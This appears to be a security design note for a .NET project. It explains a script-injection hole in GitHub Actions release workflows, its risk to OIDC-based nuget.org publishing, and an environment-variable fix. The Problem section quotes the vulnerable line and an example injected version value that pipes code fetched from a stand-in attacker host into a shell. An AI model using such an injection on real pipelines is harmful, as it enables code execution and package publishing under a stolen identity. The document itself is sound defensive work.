# Design — #21: script injection in the release workflows

**Date:** 2026-08-04 · **Issue:** #21 · **Branch:** `fix/21-workflow-script-injection` ·
**Checkout:** `/home/cyril/Documents/devs/data.net`

## Problem

`.github/workflows/release-nuget-org.yml` interpolates a `workflow_dispatch`
input straight into a shell command:

```yaml
dotnet pack "$proj" --configuration Release -o artifacts -p:Version=${{ inputs.version }}
```

GitHub substitutes the expression into the script **before the shell runs**, so
the value is not an argument — it is source code. A version of
`1.0.0; curl attacker.sh | sh` executes.

SonarQube Cloud rates this a **Blocker**, and that rating is right rather than
alarmist. What earns it is the job the pattern sits in:

```yaml
permissions:
  id-token: write   # required for OIDC / Trusted Publishing
```

That job exchanges an OIDC token for a **temporary nuget.org publishing key**.
Command execution there means publishing packages under this project's identity —
precisely the outcome Trusted Publishing was adopted to prevent.

## Decisions

### D1 — Pass values through the environment, so the shell receives data

```yaml
- name: Pack
  env:
    VERSION: ${{ inputs.version }}
  run: |
    dotnet pack "$proj" --configuration Release -o artifacts -p:Version="$VERSION"
```

The expression is expanded by the runner into an environment variable, and
`"$VERSION"` is quoted shell. The value can then never be parsed as a command.

This is the fix, not input validation. Validating a version string would leave the
next interpolation to be written unsafely; the environment indirection removes the
class.

### D2 — Fix `release.yml` in the same pass, even though its value looks safer

It has the same pattern at line 39, using a value derived from `GITHUB_REF_NAME`.
Tag names are attacker-influenceable in the general case, and **GitHub's own
guidance treats `ref_name` as untrusted**.

Leaving it would also leave two examples of the pattern in the repository, one
safe and one not, which is how the unsafe one gets copied.

### D3 — Move the secrets out of the command line too

`${{ steps.login.outputs.NUGET_API_KEY }}` and `${{ secrets.GITHUB_TOKEN }}` are
not user-controlled, so this is not part of the vulnerability. It is still worth
doing in the same pass: keeping secrets off the command line avoids exposure
through process listings.

Say plainly in the pull request which change is the fix and which is hygiene, so a
reviewer does not have to guess at the threat model.

## Out of scope

- Pinning actions to commit SHAs (#24) and hardening dependency installation
  (#22). Same security sweep, different classes, separate branches.
- Any change to what the release workflows actually do.

## What "done" means

No `${{ }}` expression carrying user- or ref-controlled data appears inside a
`run:` block in **any** workflow; both release workflows pack from an environment
variable; SonarQube Cloud reports no remaining injection finding.
